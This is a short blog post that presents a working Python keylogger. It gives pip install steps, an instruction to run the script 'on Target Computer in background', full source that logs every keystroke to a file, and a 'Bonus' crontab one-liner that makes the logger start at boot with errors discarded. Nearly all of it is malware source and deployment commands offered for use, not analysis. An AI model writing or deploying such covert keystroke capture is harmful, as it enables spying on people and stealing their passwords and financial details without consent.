---
title: Simple Keylogger
date: 2025-05-26 00:00:00 +0000
categories:
  - Others
tags:
  - keylogger
image: preview-image.png
media_subpath: /assets/img/Others/2025-05-26-simple-keylogger/
---

## Overview

**Keylogger** is a malicious program that is specifically designed to monitor and log the keystrokes made by the user on their keyboards. It is a form of spyware program used by cybercriminals to fetch sensitive information like banking details, login credentials of social media accounts, credit card number, etc.

## Usage

* Install required python libraries for our program to run correctly.
* [pynput](https://pypi.org/project/pynput/)

```bash
pip install pynput
```

* Run keylogger.py on Target Computer in background.

```bash
python3 keylogger.py &
```

* This will log the keystrokes until the program is stop manually.

```python
from pynput import keyboard
import os
import datetime

# Location where new log file will be created for storing logged keystrokes.
log_file = f'/home/kali/Desktop/Keylogger/{datetime.datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

# Creating a function to print the key pressed while listening on keylogger.
def key_pressed(key):
    with open(log_file, 'a') as f:

        # wrtie the normal charaters to log.
        try:
            f.write(key.char)

        # Handle and write special keys to log file.
        except AttributeError:

            # Open the file again in binary mode to use seek option to remove last character in the file.
            if key == keyboard.Key.backspace:
                 with open(log_file, 'rb+') as f:
                    f.seek(-1, os.SEEK_END)
                    f.truncate()
                    f.close()

            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.enter:
                f.write("\r")
            elif key == keyboard.Key.space:
                f.write(" ")
            
            # if any rough keys are pressed except known ones then it will right the key name it self.
            else:
                f.write("\n"+str(key)+"\n")

# Start the listener and give in the function(key_pressed) to perform when a key is pressed (on_press)
with keyboard.Listener(on_press=key_pressed) as listener:
    listener.join()

# Note: if Windows key is pressed the keylogger will note it as: 
#     Key.cmd
#     Key.ctrl
#     Key.esc  
```

![](2025-05-26-simple-keylogger-2.png)


Once the Program is started from that very movement each and every keys are logged in the output file. we can now check out the log file to see results.

![](2025-05-26-simple-keylogger-3.png)

* To further close the program use the following command with the respective PID of your program.

```bash
kill 12529
```

## Bonus

We Can further get more creative and it to the startup list of programs to run our program every time the system is started. This can be achieved using many diff. methods, here we are using crontab on boot.

```
(crontab -l ; echo "@reboot sleep 200 && \bin\python3 \home\kali\Desktop\Keylogger\main.py")|crontab 2> /dev/null
```
